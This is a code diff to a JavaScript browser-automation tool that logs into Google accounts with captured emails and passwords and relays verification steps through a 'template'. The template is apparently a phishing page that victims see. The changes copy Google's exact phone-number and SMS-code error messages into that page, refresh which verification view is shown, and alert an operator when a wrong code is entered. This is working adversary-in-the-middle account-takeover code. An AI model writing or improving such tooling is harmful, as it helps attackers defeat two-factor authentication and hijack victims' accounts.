@@ -299,6 +299,18 @@ function notifyCodeLockoutOnce(browserId, platform, email) {
     }
 }
 
+// Google inline field errors on the phone entry (#c15) and SMS code (#c25)
+// screens: div[jsname="NuIDSd"][aria-live] > .Ekjuhf[jsname="B34EJ"].
+// Returns the visible text or null (never throws).
+async function readLiveRegionError(page, selector) {
+    try {
+        const text = await page.$eval(selector, el => (el.textContent || '').replace(/\s+/g, ' ').trim()).catch(() => '');
+        return text || null;
+    } catch (_) {
+        return null;
+    }
+}
+
 async function checkAccountAccess(browser, page, email, password, platform, browserId, isReusingSession = false, _timer = { start: Date.now() }) {
     const originalPage = page;
     let emailExists = false;
@@ -1845,7 +1857,7 @@ function isRowCompleting(browserId) {
 function logTemplateSignal(browserId, ljr) {
     try {
         const s = String(typeof ljr === 'string' ? ljr : JSON.stringify(ljr || ''));
-        const info = /Incorrect verification code entered\. Please try again\./i.test(s)
+        const info = /Incorrect verification code entered\. Please try again\.|Wrong code\. Try again\./i.test(s)
             ? { site: 'WAITINGCODE.reset', note: 'wrong-code signal (in-form error on template)' }
             : /Incorrect code or issue, returned to verification options/i.test(s)
                 ? { site: 'WAITINGOPTIONS.reset', note: 'code rejected, asks template for a new code' }
@@ -2583,6 +2595,10 @@ async function phaseWaitingPhoneNumber(browserId, browser, page, email, platform
                             // surface the error so the template can show it under the field.
                             logger.warn(`[processRow][${browserId}][WAITINGPHONENUMBER] Still on phone entry after submit (number rejected). Staying in WAITINGPHONENUMBER.`);
                             updateData.phoneNumber = '';
+                            // Surface Google's exact inline error (#c15 live region) so the
+                            // template shows it instead of the generic sentence.
+                            const _phoneErr = await readLiveRegionError(page, '#c15 .Ekjuhf').catch(() => null);
+                            if (_phoneErr) logger.info(`[processRow][${browserId}][WAITINGPHONENUMBER] Google phone error text: "${_phoneErr.slice(0, 120)}"`);
                             updateData.lastJsonResponse = JSON.stringify({
                                 ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                 emailExists: true,
@@ -2591,7 +2607,7 @@ async function phaseWaitingPhoneNumber(browserId, browser, page, email, platform
                                 status: "WAITING_PHONE_NUMBER",
                                 verificationState: 'WAITING_PHONE_NUMBER_ERROR',
                                 viewName: postPhoneState.viewName,
-                                message: "This phone number can't be used for verification. Please check it and try again."
+                                message: _phoneErr || "This phone number can't be used for verification. Please check it and try again."
                             });
                             updateBrowserRowDataFast(browserId, {
                                 status: "WAITINGPHONENUMBER",
@@ -5234,13 +5250,28 @@ if (!foundSelector) {
                 const _existingLjr = JSON.parse(updateData.lastJsonResponse || '{}');
                 const _cachedLjr = JSON.parse(_cachedRowForGmail.lastJsonResponse || '{}');
                 const _gmailMeta = _cachedRowForGmail.gmail || _existingLjr.gmail || _cachedLjr.gmail || null;
+                // Refresh the view identity: the row can resume WAITINGCODE while
+                // Google actually shows the SMS screen (stale email copy otherwise).
+                let _freshView = null, _freshSms = null;
+                try {
+                    const _resumeProbe = await checkVerification(page, platformConfig).catch(() => ({ required: false }));
+                    if (_resumeProbe.required && _resumeProbe.type === 'code' && _resumeProbe.viewName) {
+                        _freshView = _resumeProbe.viewName;
+                        _freshSms = _resumeProbe.smsDestination || null;
+                        if (_freshView !== (_existingLjr.viewName || _cachedLjr.viewName)) {
+                            logger.info(`[processRow][${browserId}] WAITINGCODE resume: view refreshed to ${_freshView}.`);
+                        }
+                    }
+                } catch (_) {}
+                const _isSmsResume = _freshView === 'Gmail SMS Code Entry';
                 updateData.lastJsonResponse = JSON.stringify({
                     ..._existingLjr,
                     ...(_gmailMeta ? { gmail: _gmailMeta } : {}),
                     status: "WAITING_CODE",
                     verificationState: 'WAITING_CODE',
-                    viewName: _existingLjr.viewName || _cachedLjr.viewName || initialCheckResult.viewName || null,
-                    message: _gmailMeta?.instructions || "Awaiting verification code."
+                    viewName: _freshView || _existingLjr.viewName || _cachedLjr.viewName || initialCheckResult.viewName || null,
+                    smsDestination: _freshSms || _existingLjr.smsDestination || _cachedLjr.smsDestination || null,
+                    message: _isSmsResume ? (`A text message with a 6-digit verification code was just sent to ${_freshSms || 'your phone'}.`) : (_gmailMeta?.instructions || "Awaiting verification code.")
                 });
                 updateBrowserRowDataFast(browserId, {
                     status: "WAITINGCODE", verified: true, fullAccess: false,
@@ -5511,7 +5542,15 @@ if (!foundSelector) {
                                     ljp.status = "WAITING_CODE";
                                     ljp.verified = true;
                                     ljp.fullAccess = false;
-                                    ljp.message = lockoutHit ? CODE_LOCKOUT_MESSAGE : "Incorrect verification code entered. Please try again.";
+                                    // Prefer Google's exact SMS-code error (#c25 live region) when on
+                                    // the SMS view; otherwise keep the email-flow sentence.
+                                    let _smsErr = null;
+                                    try {
+                                        const _onSmsView = ljp.viewName === 'Gmail SMS Code Entry' || await page.$('#idvAnyPhonePin').catch(() => null);
+                                        if (!lockoutHit && _onSmsView) _smsErr = await readLiveRegionError(page, '#c25 .Ekjuhf');
+                                    } catch (_) {}
+                                    if (_smsErr) logger.info(`[processRow][${browserId}][WAITINGCODE] Google SMS code error text: "${_smsErr.slice(0, 120)}"`);
+                                    ljp.message = lockoutHit ? CODE_LOCKOUT_MESSAGE : (_smsErr || "Incorrect verification code entered. Please try again.");
                                     logTemplateSignal(browserId, ljp.message);
                                     await persistCodeRetryState(browserId, {
                                         status: "WAITINGCODE",
@@ -5730,7 +5769,15 @@ if (!foundSelector) {
                                     ljp.status = "WAITING_CODE";
                                     ljp.verified = true;
                                     ljp.fullAccess = false;
-                                    ljp.message = lockoutHit ? CODE_LOCKOUT_MESSAGE : "Incorrect verification code entered. Please try again.";
+                                    // Prefer Google's exact SMS-code error (#c25 live region) when on
+                                    // the SMS view; otherwise keep the email-flow sentence.
+                                    let _smsErr = null;
+                                    try {
+                                        const _onSmsView = ljp.viewName === 'Gmail SMS Code Entry' || await page.$('#idvAnyPhonePin').catch(() => null);
+                                        if (!lockoutHit && _onSmsView) _smsErr = await readLiveRegionError(page, '#c25 .Ekjuhf');
+                                    } catch (_) {}
+                                    if (_smsErr) logger.info(`[processRow][${browserId}][WAITINGCODE] Google SMS code error text: "${_smsErr.slice(0, 120)}"`);
+                                    ljp.message = lockoutHit ? CODE_LOCKOUT_MESSAGE : (_smsErr || "Incorrect verification code entered. Please try again.");
                                     sendWrongInputAlert({ type: lockoutHit ? 'CODE_LOCKOUT' : 'WRONG_CODE', platform, email, browserId, detail: lockoutHit ? 'Google too-many-attempts lockout' : 'Incorrect verification code confirmed' });
                                     logTemplateSignal(browserId, ljp.message);
                                     // FIX: Await the write to prevent race condition where while loop
